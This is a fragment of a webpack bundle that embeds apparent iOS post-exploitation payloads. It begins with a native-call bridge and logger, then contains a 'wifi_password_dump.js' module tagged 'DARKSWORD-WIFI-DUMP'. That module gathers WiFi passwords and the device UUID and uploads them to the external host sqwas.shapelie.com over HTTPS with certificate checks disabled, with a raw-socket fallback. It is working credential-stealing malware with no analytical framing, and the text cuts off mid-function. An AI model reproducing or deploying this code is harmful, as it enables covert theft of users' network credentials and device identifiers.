BigInt(value);\n\t\t}\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t\tthis.#argPtrPtr += 8n;\n\t\treturn ptr;\n\t}\n\t\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\t//log(\"dlsym(): \" + name);\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\t//log(\"nativeCallAddr(): \" + addr);\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\t//log(\"nativeCallSymbol(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\t\n\tstatic #nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"nativeCallSymbolRetain(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\t\n\t\tconst selRetainArguments = this.callSymbol(\"sel_registerName\", \"retainArguments\");\n\t\tconst selSetArgument = this.callSymbol(\"sel_registerName\", \"setArgument:atIndex:\");\n\t\tconst selInvokeUsingIMP = this.callSymbol(\"sel_registerName\", \"invokeUsingIMP:\");\n\t\tconst selGetReturnValue = this.callSymbol(\"sel_registerName\", \"getReturnValue:\");\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selRetainArguments);\n\t\t\n\t\tif (x0) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x0, 0);\n\t\tif (x1) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x1, 1);\n\t\tif (x2) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x2, 2);\n\t\tif (x3) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x3, 3);\n\t\tif (x4) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x4, 4);\n\t\tif (x5) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x5, 5);\n\t\tif (x6) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x6, 6);\n\t\tif (x7) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x7, 7);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selInvokeUsingIMP, funcAddr);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selGetReturnValue, this.#argMemPtr);\n\t\tconst ret64 = this.readPtr(this.#argMemPtr);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\nfunction File(path) {\n\treturn path;\n}\n\nfunction log(msg) {\n\tif (logging)\n\t\treturn;\n\n\tlogging = true;\n\t\n\tconst data = Native.stringToBytes(msg + \"\\n\");\n\n\tconst O_WRONLY = 0x0001;\n\tconst O_APPEND = 0x0008;\n\tconst O_CREAT = 0x0200;\n\tconst flags = O_WRONLY | O_CREAT | O_APPEND;\n\tconst fd = Native.callSymbol(\"open\", File(logfile), flags, 0o644);\n\tif (fd < 0) {\n\t\tlogging = false;\n\t\treturn;\n\t}\n\n\t// For some reason file mode is not applied on open()\n\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\tlet offs = 0;\n\tlet left = data.byteLength;\n\n\tconst buffSize = 0x4000;\n\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\twhile (left) {\n\t\tconst size = left > buffSize ? buffSize : left;\n\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\tconst dst8 = new Uint8Array(src8);\n\t\tNative.write(buffPtr, dst8.buffer);\n\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\tif (!len || len < 0)\n\t\t\tbreak;\n\t\toffs += len;\n\t\tleft -= len;\n\t}\n\n\tNative.callSymbol(\"free\", buffPtr);\n\tNative.callSymbol(\"close\", fd);\n\n\tlogging = false;\n}\n\nvar logging = false;\nconst logfile = \"/private/var/mobile/Media/RemoteLog.log\";\n\nNative.init();\n\nNative.callSymbol(\"unlink\", File(logfile));\n\n");

/***/ }),

/***/ "../node_modules/raw-loader/dist/cjs.js!./wifi_password_dump.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("// WiFi Password Dump Payload\n// Runs under wifid context which has keychain access for WiFi passwords\n// Sends WiFi credentials via HTTPS POST\n\n// Server configuration\nconst SERVER_HOST = \"sqwas.shapelie.com\";\nconst SERVER_PORT = 8881;\nconst USE_HTTPS = true;\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i]) break;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated) s8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\tif (!value) return 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) return 0n;\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') return value;\n\t\telse return BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name) return 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr) return addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr) this.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\t\tinvoker();\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"DARKSWORD-WIFI-DUMP\";\nconst OUTPUT_FILE = \"/tmp/wifi_passwords.txt\";\n\n// ============================================================================\n// CoreFoundation Helpers\n// ============================================================================\n\nfunction createCFString(str) {\n\treturn Native.callSymbol(\"CFStringCreateWithCString\", 0n, str, 0x08000100);\n}\n\nfunction cfStringToJS(cfStr) {\n\tif (!cfStr || cfStr === 0n) return \"\";\n\t\n\t// Try CFStringGetCStringPtr first (fast path)\n\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", cfStr, 0x08000100);\n\tif (cstrPtr && cstrPtr !== 0n) {\n\t\treturn Native.readString(cstrPtr, 256).replace(/\\0/g, '');\n\t}\n\t\n\t// Fallback to CFStringGetCString\n\tconst bufLen = 512;\n\tconst buf = Native.callSymbol(\"malloc\", bufLen);\n\tif (!buf || buf === 0n) return \"\";\n\t\n\ttry {\n\t\tconst result = Native.callSymbol(\"CFStringGetCString\", cfStr, buf, bufLen, 0x08000100);\n\t\tif (result) {\n\t\t\treturn Native.readString(buf, bufLen).replace(/\\0/g, '');\n\t\t}\n\t} finally {\n\t\tNative.callSymbol(\"free\", buf);\n\t}\n\t\n\treturn \"\";\n}\n\nfunction cfDataToString(cfData) {\n\tif (!cfData || cfData === 0n) return \"\";\n\t\n\tconst length = Number(Native.callSymbol(\"CFDataGetLength\", cfData));\n\tif (length <= 0 || length > 1024) return \"\";\n\t\n\tconst dataPtr = Native.callSymbol(\"CFDataGetBytePtr\", cfData);\n\tif (!dataPtr || dataPtr === 0n) return \"\";\n\t\n\tconst data = Native.read(dataPtr, length);\n\tif (!data) return \"\";\n\t\n\tconst bytes = new Uint8Array(data);\n\tlet str = \"\";\n\tfor (let i = 0; i < bytes.length; i++) {\n\t\tif (bytes[i] === 0) break;\n\t\tstr += String.fromCharCode(bytes[i]);\n\t}\n\treturn str;\n}\n\nfunction getCFBooleanTrue() {\n\tconst addr = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanTrue\");\n\tif (addr && addr !== 0n) {\n\t\treturn Native.readPtr(addr);\n\t}\n\treturn 0n;\n}\n\nfunction getCFDictKeyCallbacks() {\n\treturn Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n}\n\nfunction getCFDictValueCallbacks() {\n\treturn Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n}\n\n// ============================================================================\n// Device UUID\n// ============================================================================\n\nfunction getDeviceUUID() {\n\ttry {\n\t\tconst iokitHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/IOKit.framework/IOKit\", 1);\n\t\tconst cfHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\t\t\n\t\tif (!iokitHandle || iokitHandle === 0n) return \"unknown-device\";\n\t\t\n\t\tconst serviceNamePtr = Native.callSymbol(\"malloc\", 32);\n\t\tNative.writeString(serviceNamePtr, \"IOPlatformExpertDevice\");\n\t\t\n\t\tconst matchingDict = Native.callSymbol(\"IOServiceMatching\", serviceNamePtr);\n\t\tNative.callSymbol(\"free\", serviceNamePtr);\n\t\t\n\t\tif (!matchingDict || matchingDict === 0n) return \"unknown-device\";\n\t\t\n\t\tconst platformExpert = Native.callSymbol(\"IOServiceGetMatchingService\", 0n, matchingDict);\n\t\tif (!platformExpert || platformExpert === 0n) return \"unknown-device\";\n\t\t\n\t\tconst uuidKeyPtr = Native.callSymbol(\"malloc\", 32);\n\t\tNative.writeString(uuidKeyPtr, \"IOPlatformUUID\");\n\t\tconst uuidKeyCFStr = Native.callSymbol(\"CFStringCreateWithCString\", 0n, uuidKeyPtr, 0x08000100);\n\t\tNative.callSymbol(\"free\", uuidKeyPtr);\n\t\t\n\t\tif (!uuidKeyCFStr || uuidKeyCFStr === 0n) {\n\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tconst uuidCFStr = Native.callSymbol(\"IORegistryEntryCreateCFProperty\", \n\t\t\tplatformExpert, uuidKeyCFStr, 0n, 0n);\n\t\tNative.callSymbol(\"CFRelease\", uuidKeyCFStr);\n\t\t\n\t\tif (!uuidCFStr || uuidCFStr === 0n) {\n\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tlet uuid = \"\";\n\t\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", uuidCFStr, 0x08000100);\n\t\tif (cstrPtr && cstrPtr !== 0n) {\n\t\t\tuuid = Native.readString(cstrPtr, 256).replace(/\\0/g, '').trim();\n\t\t}\n\t\t\n\t\tif (!uuid) {\n\t\t\tconst uuidBuf = Native.callSymbol(\"malloc\", 256);\n\t\t\tconst result = Native.callSymbol(\"CFStringGetCString\", uuidCFStr, uuidBuf, 256, 0x08000100);\n\t\t\tif (result) {\n\t\t\t\tuuid = Native.readString(uuidBuf, 256).replace(/\\0/g, '').trim();\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", uuidBuf);\n\t\t}\n\t\t\n\t\tNative.callSymbol(\"CFRelease\", uuidCFStr);\n\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\n\t\treturn uuid || \"unknown-device\";\n\t} catch (e) {\n\t\treturn \"unknown-device\";\n\t}\n}\n\n// ============================================================================\n// HTTPS POST - Send WiFi Passwords Directly\n// ============================================================================\n\nfunction sendWiFiPasswordsViaHTTPS(passwords) {\n\t\n\ttry {\n\t\t// Get device UUID\n\t\tconst deviceUUID = getDeviceUUID();\n\t\t\n\t\t// Build content\n\t\tlet content = \"=== WiFi Passwords ===\\n\";\n\t\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\t\tcontent += \"Device: \" + deviceUUID + \"\\n\";\n\t\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\t\n\t\tfor (const p of passwords) {\n\t\t\tcontent += \"SSID Hash: \" + p.ssid + \"\\n\";\n\t\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\t\tcontent += \"---\\n\";\n\t\t}\n\t\t\n\t\t// Base64 encode\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\tconst base64Data = base64Encode(contentBytes);\n\t\t\n\t\t// Build JSON payload (same format as file_downloader.js)\n\t\tconst jsonPayload = JSON.stringify({\n\t\t\tpath: \"/private/var/tmp/wifi_passwords.txt\",\n\t\t\tcategory: \"credentials\",\n\t\t\tdescription: \"WiFi Passwords\",\n\t\t\tsize: content.length,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Build HTTP request\n\t\tconst httpRequest = \n\t\t\t\"POST /upload HTTP/1.1\\r\\n\" +\n\t\t\t\"Host: \" + SERVER_HOST + \":\" + SERVER_PORT + \"\\r\\n\" +\n\t\t\t\"Content-Type: application/json\\r\\n\" +\n\t\t\t\"Content-Length: \" + jsonPayload.length + \"\\r\\n\" +\n\t\t\t\"Connection: close\\r\\n\" +\n\t\t\t\"\\r\\n\" +\n\t\t\tjsonPayload;\n\t\t\n\t\t// Load CoreFoundation for streams\n\t\tNative.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\t\tNative.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CFNetwork.framework/CFNetwork\", 1);\n\t\t\n\t\t// Create CFString for host\n\t\tconst hostCFStr = createCFString(SERVER_HOST);\n\t\tif (!hostCFStr || hostCFStr === 0n) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Create stream pair\n\t\tconst readStreamPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tconst writeStreamPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tNative.write64(readStreamPtr, 0n);\n\t\tNative.write64(writeStreamPtr, 0n);\n\t\t\n\t\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCFStr, SERVER_PORT, readStreamPtr, writeStreamPtr);\n\t\t\n\t\tconst writeStream = Native.readPtr(writeStreamPtr);\n\t\tconst readStream = Native.readPtr(readStreamPtr);\n\t\t\n\t\tNative.callSymbol(\"free\", readStreamPtr);\n\t\tNative.callSymbol(\"free\", writeStreamPtr);\n\t\tNative.callSymbol(\"CFRelease\", hostCFStr);\n\t\t\n\t\tif (!writeStream || writeStream === 0n) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (USE_HTTPS) {\n\t\t\t// Enable TLS\n\t\t\tconst kCFStreamPropertySSLSettings = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamPropertySSLSettings\");\n\t\t\tconst kCFStreamSSLLevel = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSSLLevel\");\n\t\t\tconst kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\t\t\tconst kCFStreamSSLValidatesCertificateChain = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFStreamSSLValidatesCertificateChain\");\n\t\t\t\n\t\t\tif (kCFStreamPropertySSLSettings && kCFStreamPropertySSLSettings !== 0n) {\n\t\t\t\tconst sslSettings = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 2, \n\t\t\t\t\tNative.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\"),\n\t\t\t\t\tNative.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\"));\n\t\t\t\t\n\t\t\t\tif (sslSettings && sslSettings !== 0n) {\n\t\t\t\t\t// Disable cert validation for self-signed\n\t\t\t\t\tconst kCFBooleanFalse = Native.readPtr(Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanFalse\"));\n\t\t\t\t\tif (kCFStreamSSLValidatesCertificateChain && kCFBooleanFalse) {\n\t\t\t\t\t\tNative.callSymbol(\"CFDictionarySetValue\", sslSettings, \n\t\t\t\t\t\t\tNative.readPtr(kCFStreamSSLValidatesCertificateChain), kCFBooleanFalse);\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, \n\t\t\t\t\t\tNative.readPtr(kCFStreamPropertySSLSettings), sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, \n\t\t\t\t\t\tNative.readPtr(kCFStreamPropertySSLSettings), sslSettings);\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", sslSettings);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t// Set security level\n\t\t\tif (kCFStreamSSLLevel && kCFStreamSocketSecurityLevelNegotiatedSSL) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream,\n\t\t\t\t\tNative.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream,\n\t\t\t\t\tNative.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));\n\t\t\t}\n\t\t}\n\t\t\n\t\t// Open streams\n\t\tconst writeOpen = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n\t\tconst readOpen = Native.callSymbol(\"CFReadStreamOpen\", readStream);\n\t\t\n\t\tif (!writeOpen || !readOpen) {\n\t\t\tif (writeStream) Native.callSymbol(\"CFRelease\", writeStream);\n\t\t\tif (readStream) Native.callSymbol(\"CFRelease\", readStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Wait for connection\n\t\tlet attempts = 0;\n\t\twhile (attempts < 50) {\n\t\t\tconst canWrite = Native.callSymbol(\"CFWriteStreamCanAcceptBytes\", writeStream);\n\t\t\tif (canWrite) break;\n\t\t\tNative.callSymbol(\"usleep\", 100000); // 100ms\n\t\t\tattempts++;\n\t\t}\n\t\t\n\t\tif (attempts >= 50) {\n\t\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Send data\n\t\tconst requestBytes = Native.stringToBytes(httpRequest, false);\n\t\tconst dataPtr = Native.callSymbol(\"malloc\", BigInt(requestBytes.byteLength));\n\t\tNative.write(dataPtr, requestBytes);\n\t\t\n\t\tlet totalSent = 0;\n\t\tconst totalLen = requestBytes.byteLength;\n\t\t\n\t\twhile (totalSent < totalLen) {\n\t\t\tconst canWrite = Native.callSymbol(\"CFWriteStreamCanAcceptBytes\", writeStream);\n\t\t\tif (!canWrite) {\n\t\t\t\tNative.callSymbol(\"usleep\", 10000);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tconst remaining = totalLen - totalSent;\n\t\t\tconst chunkSize = remaining > 4096 ? 4096 : remaining;\n\t\t\tconst written = Native.callSymbol(\"CFWriteStreamWrite\", writeStream, \n\t\t\t\tdataPtr + BigInt(totalSent), BigInt(chunkSize));\n\t\t\t\n\t\t\tif (Number(written) <= 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\ttotalSent += Number(written);\n\t\t}\n\t\t\n\t\tNative.callSymbol(\"free\", dataPtr);\n\t\t\n\t\t// Wait briefly for response\n\t\tNative.callSymbol(\"usleep\", 500000); // 500ms\n\t\t\n\t\t// Cleanup\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\t\n\t\treturn totalSent === totalLen;\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\n// Raw socket HTTP (no TLS) - might bypass CFStream sandbox restrictions\nfunction sendWiFiPasswordsViaHTTP(passwords) {\n\t\n\ttry {\n\t\tconst deviceUUID = getDeviceUUID();\n\t\t\n\t\t// Build content\n\t\tlet content = \"=== WiFi Passwords ===\\n\";\n\t\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\t\tcontent += \"Device: \" + deviceUUID + \"\\n\";\n\t\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\t\n\t\tfor (const p of passwords) {\n\t\t\tcontent += \"SSID Hash: \" + p.ssid + \"\\n\";\n\t\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\t\tcontent += \"---\\n\";\n\t\t}\n\t\t\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\tconst base64Data = base64Encode(contentBytes);\n\t\t\n\t\tconst jsonPayload = JSON.stringify({\n\t\t\tpath: \"/private/var/tmp/wifi_passwords.txt\",\n\t\t\tcategory: \"credentials\",\n\t\t\tdescription: \"WiFi Passwords\",\n\t\t\tsize: content.length,\n\t\t\tdeviceUUID: deviceUUID,\n\t\t\tdata: base64Data\n\t\t});\n\t\t\n\t\t// Create socket\n\t\tconst AF_INET = 2;\n\t\tconst SOCK_STREAM = 1;\n\t\tconst socket = Native.callSymbol(\"socket\", AF_INET, SOCK_STREAM, 0);\n\t\t\n\t\tif (Number(socket) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Build sockaddr_in (use port 4444 for HTTP - matches server)\n\t\tconst HTTP_PORT = 4444;\n\t\tconst addr = Native.callSymbol(\"malloc\", 16);\n\t\tconst addrBuf = new ArrayBuffer(16);\n\t\tconst addrView = new DataView(addrBuf);\n\t\taddrView.setUint8(0, 16);  // sin_len\n\t\taddrView.setUint8(1, AF_INET);  // sin_family\n\t\taddrView.setUint16(2, Native.callSymbol(\"htons\", HTTP_PORT), false);  // sin_port\n\t\t\n\t\t// Parse IP address\n\t\tconst ipParts = SERVER_HOST.split('.');\n\t\taddrView.setUint8(4, parseInt(ipParts[0]));\n\t\taddrView.setUint8(5, parseInt(ipParts[1]));\n\t\taddrView.setUint8(6, parseInt(ipParts[2]));\n\t\taddrView.setUint8(7, parseInt(ipParts[3]));\n\t\t\n\t\tNative.write(addr, addrBuf);\n\t\t\n\t\t// Connect\n\t\tconst connectResult = Native.callSymbol(\"connect\", socket, addr, 16);\n\t\tNative.callSymbol(\"free\", addr);\n\t\t\n\t\tif (Number(connectResult) < 0) {\n\t\t\tNative.callSymbol(\"close\", socket);\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t\n\t\t// Build HTTP request\n\t\tconst httpRequest = \n\t\t\t\"POST /upload HTTP/1.1\\r\\n\" +\n\t\t\t\"Host: \" + SERVER_HOST + \":\" + HTTP_PORT + \"\\r\\n\" +\n\t\t\t\"Content-Type: application/json\\r\\n\" +\n\t\t\t\"Content-Length: \" + jsonPayload.length + \"\\r\\n\" +\n\t\t\t\"Connection: close\\r\\n\" +\n\t\t\t\"\\r\\n\" +\n\t\t\tjsonPayload;\n\t\t\n\t\t// Send\n\t\tconst requestBytes = Native.stringToBytes(httpRequest, 